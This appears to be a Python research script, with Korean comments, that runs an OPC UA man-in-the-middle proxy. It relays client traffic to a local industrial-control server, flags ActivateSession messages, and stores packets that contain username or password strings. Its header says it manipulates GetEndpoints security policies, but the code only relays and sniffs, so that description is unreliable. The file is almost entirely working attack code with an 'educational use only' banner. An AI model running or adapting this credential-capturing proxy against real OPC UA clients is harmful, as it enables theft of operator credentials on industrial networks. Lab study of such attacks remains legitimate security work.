#!/usr/bin/env python3
"""
Step 2: OPC UA MITM 프록시
GetEndpoints 응답을 가로채서 보안 정책을 조작합니다.
"""
import sys
sys.path.insert(0, '/root/opcua-research/python-opcua-env/lib/python3.10/site-packages')

import socket
import threading
import struct
from opcua import ua

class OPCUAProxy:
    """OPC UA MITM 프록시"""
    
    def __init__(self, listen_port, target_host, target_port):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.captured_passwords = []
        
    def start(self):
        """프록시 서버 시작"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.listen_port))
        server_socket.listen(5)
        
        print(f"🔧 MITM 프록시 시작")
        print(f"   리스닝: 0.0.0.0:{self.listen_port}")
        print(f"   타겟: {self.target_host}:{self.target_port}")
        print()
        
        try:
            while True:
                client_socket, addr = server_socket.accept()
                print(f"📡 클라이언트 연결: {addr}")
                
                # 새 스레드에서 처리
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket,)
                )
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            print("\n🛑 프록시 종료")
        finally:
            server_socket.close()
    
    def handle_client(self, client_socket):
        """클라이언트 요청 처리"""
        try:
            # 타겟 서버에 연결
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))
            
            print(f"   ✅ 타겟 서버 연결 성공")
            
            # 양방향 데이터 전달 (패킷 분석 포함)
            self.relay_data(client_socket, server_socket)
            
        except Exception as e:
            print(f"   ❌ 오류: {e}")
        finally:
            client_socket.close()
            try:
                server_socket.close()
            except:
                pass
    
    def relay_data(self, client_socket, server_socket):
        """데이터 중계 및 분석"""
        
        def forward(source, destination, direction):
            """데이터 전달 및 분석"""
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    
                    # 패킷 분석
                    self.analyze_packet(data, direction)
                    
                    # 데이터 전달
                    destination.sendall(data)
            except:
                pass
        
        # 양방향 스레드 생성
        c2s = threading.Thread(target=forward, args=(client_socket, server_socket, "C→S"))
        s2c = threading.Thread(target=forward, args=(server_socket, client_socket, "S→C"))
        
        c2s.daemon = True
        s2c.daemon = True
        
        c2s.start()
        s2c.start()
        
        c2s.join()
        s2c.join()
    
    def analyze_packet(self, data, direction):
        """패킷 내용 분석"""
        if len(data) < 8:
            return
        
        try:
            # OPC UA 메시지 헤더 확인
            msg_type = data[:3]
            
            if msg_type == b'MSG':
                # GetEndpoints 관련
                if b'GetEndpoints' in data:
                    print(f"   🔍 {direction} GetEndpoints 메시지 감지")
                
                # ActivateSession 관련
                if b'ActivateSession' in data:
                    print(f"   🔑 {direction} ActivateSession 메시지 감지")
                    if direction == "C→S":
                        print(f"      ⚠️  패스워드 전송 가능성!")
                        # 패스워드 추출 시도
                        self.extract_password(data)
                
        except:
            pass
    
    def extract_password(self, data):
        """ActivateSession에서 패스워드 추출"""
        try:
            # 간단한 문자열 검색
            data_str = data.decode('utf-8', errors='ignore')
            
            # Username/Password 패턴 찾기
            if 'username' in data_str.lower() or 'password' in data_str.lower():
                print(f"      🎯 인증 정보 감지!")
                
                # 추출된 데이터 저장
                self.captured_passwords.append({
                    'timestamp': __import__('time').time(),
                    'data': data[:200]  # 처음 200바이트만
                })
        except:
            pass

def main():
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║        Step 2: OPC UA MITM 프록시                             ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print()
    print("⚠️  이 도구는 교육 목적으로만 사용하세요!")
    print()
    
    # 예제: Python opcua 서버 (4841)에 대한 프록시
    # 프록시 포트: 14841 (10000 + 4841)
    proxy = OPCUAProxy(
        listen_port=14841,
        target_host='localhost',
        target_port=4841
    )
    
    print("💡 사용 방법:")
    print("   1. 이 프록시를 실행")
    print("   2. 클라이언트를 localhost:14841로 연결")
    print("   3. 프록시가 localhost:4841로 중계")
    print("   4. 중간에 패킷 분석 및 조작")
    print()
    
    try:
        proxy.start()
    except Exception as e:
        print(f"❌ 오류: {e}")

if __name__ == "__main__":
    main()
